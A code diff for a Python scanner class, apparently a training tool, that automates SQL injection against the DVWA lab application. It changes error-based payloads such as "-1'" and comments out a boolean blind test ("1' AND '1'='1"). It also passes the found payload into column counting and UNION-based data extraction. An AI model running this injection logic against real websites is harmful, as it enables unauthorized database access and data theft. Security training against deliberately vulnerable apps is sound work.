@@ -193,31 +193,31 @@ class DVWASQLiScanner(SQLInjectionScanner):
                 is_vul, db_type = self.is_vulnerable(response)
                 if is_vul:
                     self.print(f"[!] 发现SQL注入漏洞！使用Payload: {payload}")
-                    return True, 'GET', 'id', None
+                    return True, 'GET', 'id', None, payload
                     
         else:
             # 低/中安全级别使用标准测试
             
             # 测试基于错误的注入
-            error_payloads = ["1'", '1"', "1')", '1")']
+            error_payloads = ["-1'", '-1"', "-1')", '-1")']
             
             for payload in error_payloads:
                 response = self.send_request(target_url, params={'id': payload, 'Submit': 'Submit'})
                 is_vul, db_type = self.is_vulnerable(response)
                 if is_vul:
                     self.print(f"[!] 发现基于错误的SQL注入漏洞！使用Payload: {payload}")
-                    return True, 'GET', 'id', None
+                    return True, 'GET', 'id', None, payload
             
             # 测试基于布尔的盲注
-            true_payload = "1' AND '1'='1"
-            false_payload = "1' AND '1'='2"
+            # true_payload = "1' AND '1'='1"
+            # false_payload = "1' AND '1'='2"
             
-            if self.check_boolean_based(target_url, true_payload, false_payload, 'GET', 'id'):
-                self.print("[!] 发现基于布尔的SQL注入漏洞！")
-                return True, 'GET', 'id', None
+            # if self.check_boolean_based(target_url, true_payload, false_payload, 'GET', 'id'):
+            #     self.print("[!] 发现基于布尔的SQL注入漏洞！")
+            #     return True, 'GET', 'id', None
         
         self.print("[-] 未发现明显的SQL注入漏洞")
-        return False, None, None, None
+        return False, None, None, None, None
 
 
 
@@ -257,7 +257,7 @@ class DVWASQLiScanner(SQLInjectionScanner):
                     self.update_progress(20, f"设置安全级别为 {level}")
                     
                     # 在当前安全级别下运行注入测试
-                    result, method, param, data_template = self.test_dvwa_injection()
+                    result, method, param, data_template, payload = self.test_dvwa_injection()
                     
                     if result:
                         vulnerabilities_found = True
@@ -265,12 +265,12 @@ class DVWASQLiScanner(SQLInjectionScanner):
                         
                         # 检测字段数
                         target_url = urljoin(self.base_url, "vulnerabilities/sqli/")
-                        column_count = self.detect_column_count(target_url, method, param, data_template, 'string')
+                        column_count = self.detect_column_count(target_url, method, param, data_template, payload)
                         
                         if column_count:
                             self.update_progress(80, "提取数据")
                             # 使用UNION查询提取数据
-                            self.extract_with_union(target_url, method, param, data_template, 'string', column_count)
+                            self.extract_with_union(target_url, method, param, data_template, payload, column_count)
                 else:
                     self.print(f"[-] 无法设置安全级别为 {level}")
             
@@ -285,19 +285,19 @@ class DVWASQLiScanner(SQLInjectionScanner):
             self.update_progress(20, "连接成功，开始注入测试")
             
             # 运行注入测试
-            result, method, param, data_template = self.test_dvwa_injection()
+            result, method, param, data_template, payload = self.test_dvwa_injection()
             
             if result:
                 self.update_progress(60, "发现漏洞，提取信息")
                 
                 # 检测字段数
                 target_url = urljoin(self.base_url, "vulnerabilities/sqli/")
-                column_count = self.detect_column_count(target_url, method, param, data_template, 'string')
+                column_count = self.detect_column_count(target_url, method, param, data_template, payload)
                 
                 if column_count:
                     self.update_progress(80, "提取数据")
                     # 使用UNION查询提取数据
-                    self.extract_with_union(target_url, method, param, data_template, 'string', column_count)
+                    self.extract_with_union(target_url, method, param, data_template, payload, column_count)
             
             # 扫描完成
             self.update_progress(100, "扫描完成")
